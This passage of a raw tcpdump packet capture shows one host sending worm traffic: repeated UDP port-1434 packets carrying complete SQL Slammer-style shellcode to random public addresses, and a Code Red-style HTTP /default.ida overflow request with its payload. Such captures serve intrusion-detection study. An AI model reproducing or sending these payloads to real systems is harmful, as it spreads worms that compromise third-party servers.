	0x0050:  044a 7de1 17c0 0c00 0100 0100 0000 0500  .J}.............
	0x0060:  044a 7de1 18c0 0c00 0100 0100 0000 0500  .J}.............
	0x0070:  044a 7de1 1f                             .J}..
17:41:16.278184 IP (tos 0x0, ttl 64, id 32329, offset 0, flags [none], proto UDP (17), length 59)
    10.97.0.1.33864 > 10.97.0.200.53: [bad udp cksum 0x5e28 -> 0x8f49!] 41305+ A? microsoft.com. (31)
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  003b 7e49 0000 4011 9e79 0a61 0001 0a61  .;~I..@..y.a...a
	0x0020:  00c8 8448 0035 0027 5e28 a159 0100 0001  ...H.5.'.I.Y....
	0x0030:  0000 0000 0000 096d 6963 726f 736f 6674  .......microsoft
	0x0040:  0363 6f6d 0000 0100 01                   .com.....
17:41:16.355746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 77.212.79.13.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 4dd4  ..~H..@..~.a..M.
	0x0020:  4f0d cfbb 059a 0180 7f3e 0401 0101 0101  O........>......
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.421146 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 57.146.222.6.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 3992  ..~H..@..~.a..9.
	0x0020:  de06 cfbb 059a 0180 0487 0401 0101 0101  ................
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.425746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 147.188.111.23.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 93bc  ..~H..@..~.a....
	0x0020:  6f17 cfbb 059a 0180 194c 0401 0101 0101  o........L......
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.428156 IP (tos 0x0, ttl 64, id 32331, offset 0, flags [none], proto UDP (17), length 55)
    10.97.0.1.44529 > 10.97.0.200.53: [bad udp cksum 0x5e24 -> 0x51e8!] 40428+ A? yahoo.com. (27)
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0037 7e4b 0000 4011 9e7b 0a61 0001 0a61  .7~K..@..{.a...a
	0x0020:  00c8 adf1 0035 0023 5e24 9dec 0100 0001  .....5.#^$......
	0x0030:  0000 0000 0000 0579 6168 6f6f 0363 6f6d  .......yahoo.com
	0x0040:  0000 0100 01                             .....
17:41:16.465746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 2.8.44.156.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 0208  ..~H..@..~.a....
	0x0020:  2c9c cfbb 059a 0180 ed7b 0401 0101 0101  ,........{......
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.515746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 3.12.155.201.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 030c  ..~H..@..~.a....
	0x0020:  9bc9 cfbb 059a 0180 7d4a 0401 0101 0101  ........}J......
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.525746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 100.5.2.3.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 6405  ..~H..@..~.a..d.
	0x0020:  0203 cfbb 059a 0180 b617 0401 0101 0101  ................
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.559387 IP (tos 0x0, ttl 128, id 34978, offset 0, flags [none], proto UDP (17), length 103)
    10.97.0.200.53 > 10.97.0.1.44529: [udp sum ok] 40428 q: A? yahoo.com. 3/0/0 yahoo.com. [5s] A 206.190.36.45, yahoo.com. [5s] A 98.139.183.24, yahoo.com. [5s] A 98.138.253.109 (75)
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0800 4500  ..)..n.PV.E>..E.
	0x0010:  0067 88a2 0000 8011 53f4 0a61 00c8 0a61  .g......S..a...a
	0x0020:  0001 0035 adf1 0053 0158 9dec 8180 0001  ...5...S.X......
	0x0030:  0003 0000 0000 0579 6168 6f6f 0363 6f6d  .......yahoo.com
	0x0040:  0000 0100 01c0 0c00 0100 0100 0000 0500  ................
	0x0050:  04ce be24 2dc0 0c00 0100 0100 0000 0500  ...$-...........
	0x0060:  0462 8bb7 18c0 0c00 0100 0100 0000 0500  .b..............
	0x0070:  0462 8afd 6d                             .b..m
17:41:16.565746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 200.99.7.164.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 c863  ..~H..@..~.a...c
	0x0020:  07a4 cfbb 059a 0180 4c18 0401 0101 0101  ........L.......
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.569846 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 168.97.44.111.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 a861  ..~H..@..~.a...a
	0x0020:  2c6f cfbb 059a 0180 474f 0401 0101 0101  ,o......GO......
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
02:46:44.979550 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.0.2 tell 10.97.0.1, length 46
	0x0000:  ffff ffff ffff 000c 29c8 e96e 0806 0001  ........)..n....
	0x0010:  0800 0604 0001 000c 29c8 e96e 0a61 0001  ........)..n.a..
	0x0020:  0000 0000 0000 0a61 0002 0000 0000 0000  .......a........
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:44.981331 ARP, Ethernet (len 6), IPv4 (len 4), Reply 10.97.0.2 is-at 00:0c:29:3e:36:9e, length 46
	0x0000:  000c 29c8 e96e 000c 293e 369e 0806 0001  ..)..n..)>6.....
	0x0010:  0800 0604 0002 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  000c 29c8 e96e 0a61 0001 0000 0000 0000  ..)..n.a........
	0x0030:  0000 0000 0000 0000 0000 0000            ............
02:46:44.981332 IP (tos 0x0, ttl 64, id 664, offset 0, flags [DF], proto TCP (6), length 60)
    10.97.0.1.58180 > 10.97.0.2.80: Flags [S], cksum 0x63d6 (correct), seq 1819961075, win 14600, options [mss 1460,sackOK,TS val 156779 ecr 0,nop,wscale 7], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  003c 0298 4000 4006 2322 0a61 0001 0a61  .<..@.@.#".a...a
	0x0020:  0002 e344 0050 6c7a 66f3 0000 0000 a002  ...D.Plzf.......
	0x0030:  3908 63d6 0000 0204 05b4 0402 080a 0002  9.c.............
	0x0040:  646b 0000 0000 0103 0307                 dk........
02:46:44.983330 IP (tos 0x0, ttl 128, id 91, offset 0, flags [DF], proto TCP (6), length 64)
    10.97.0.2.80 > 10.97.0.1.58180: Flags [S.], cksum 0xfb79 (correct), seq 54176791, ack 1819961076, win 17520, options [mss 1460,nop,wscale 0,nop,nop,TS val 0 ecr 0,nop,nop,sackOK], length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0040 005b 4000 8006 e55a 0a61 0002 0a61  .@.[@....Z.a...a
	0x0020:  0001 0050 e344 033a ac17 6c7a 66f4 b012  ...P.D.:..lzf...
	0x0030:  4470 fb79 0000 0204 05b4 0103 0300 0101  Dp.y............
	0x0040:  080a 0000 0000 0000 0000 0101 0402       ..............
02:46:44.983331 IP (tos 0x0, ttl 64, id 665, offset 0, flags [DF], proto TCP (6), length 52)
    10.97.0.1.58180 > 10.97.0.2.80: Flags [.], cksum 0x1bd4 (correct), seq 1, ack 1, win 115, options [nop,nop,TS val 156780 ecr 0], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  0034 0299 4000 4006 2329 0a61 0001 0a61  .4..@.@.#).a...a
	0x0020:  0002 e344 0050 6c7a 66f4 033a ac18 8010  ...D.Plzf..:....
	0x0030:  0073 1bd4 0000 0101 080a 0002 646c 0000  .s..........dl..
	0x0040:  0000                                     ..
02:46:44.997053 IP (tos 0x0, ttl 64, id 666, offset 0, flags [DF], proto TCP (6), length 1076)
    10.97.0.1.58180 > 10.97.0.2.80: Flags [P.], cksum 0x98c4 (correct), seq 1:1025, ack 1, win 115, options [nop,nop,TS val 156783 ecr 0], length 1024
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  0434 029a 4000 4006 1f28 0a61 0001 0a61  .4..@.@..(.a...a
	0x0020:  0002 e344 0050 6c7a 66f4 033a ac18 8018  ...D.Plzf..:....
	0x0030:  0073 98c4 0000 0101 080a 0002 646f 0000  .s..........do..
	0x0040:  0000 4745 5420 2f64 6566 6175 6c74 2e69  ..GET./default.i
	0x0050:  6461 3f4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  da?NNNNNNNNNNNNN
	0x0060:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x0070:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x0080:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x0090:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x00a0:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x00b0:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x00c0:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x00d0:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x00e0:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x00f0:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x0100:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x0110:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x0120:  4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e 4e4e  NNNNNNNNNNNNNNNN
	0x0130:  4e4e 4e25 7539 3039 3025 7536 3835 3825  NNN%u9090%u6858%
	0x0140:  7563 6264 3325 7537 3830 3125 7539 3039  ucbd3%u7801%u909
	0x0150:  3025 7536 3835 3825 7563 6264 3325 7537  0%u6858%ucbd3%u7
	0x0160:  3830 3125 7539 3039 3025 7536 3835 3825  801%u9090%u6858%
	0x0170:  7563 6264 3325 7537 3830 3125 7539 3039  ucbd3%u7801%u909
	0x0180:  3025 7539 3039 3025 7538 3139 3025 7530  0%u9090%u8190%u0
	0x0190:  3063 3325 7530 3030 3325 7538 6230 3025  0c3%u0003%u8b00%
	0x01a0:  7535 3331 6225 7535 3366 6625 7530 3037  u531b%u53ff%u007
	0x01b0:  3825 7530 3030 3025 7530 303d 6120 2048  8%u0000%u00=a..H
	0x01c0:  5454 502f 312e 300d 0a43 6f6e 7465 6e74  TTP/1.0..Content
	0x01d0:  2d74 7970 653a 2074 6578 742f 786d 6c0a  -type:.text/xml.
	0x01e0:  484f 5354 3a77 7777 2e77 6f72 6d2e 636f  HOST:www.worm.co
	0x01f0:  6d0a 2041 6363 6570 743a 202a 2f2a 0a43  m..Accept:.*/*.C
	0x0200:  6f6e 7465 6e74 2d6c 656e 6774 683a 2033  ontent-length:.3
	0x0210:  3536 3920 0d0a 0d0a 558b ec81 ec18 0200  569.....U.......
	0x0220:  0053 5657 8dbd e8fd ffff b986 0000 00b8  .SVW............
	0x0230:  cccc cccc f3ab c785 70fe ffff 0000 0000  ........p.......
	0x0240:  e90a 0b00 008f 8568 feff ff8d bdf0 feff  .......h........
	0x0250:  ff64 a100 0000 0089 4708 6489 3d00 0000  .d......G.d.=...
	0x0260:  00e9 6f0a 0000 8f85 60fe ffff c785 f0fe  ..o.....`.......
	0x0270:  ffff ffff ffff 8b85 68fe ffff 83e8 0789  ........h.......
	0x0280:  85f4 feff ffc7 8558 feff ff00 00e0 77e8  .......X......w.
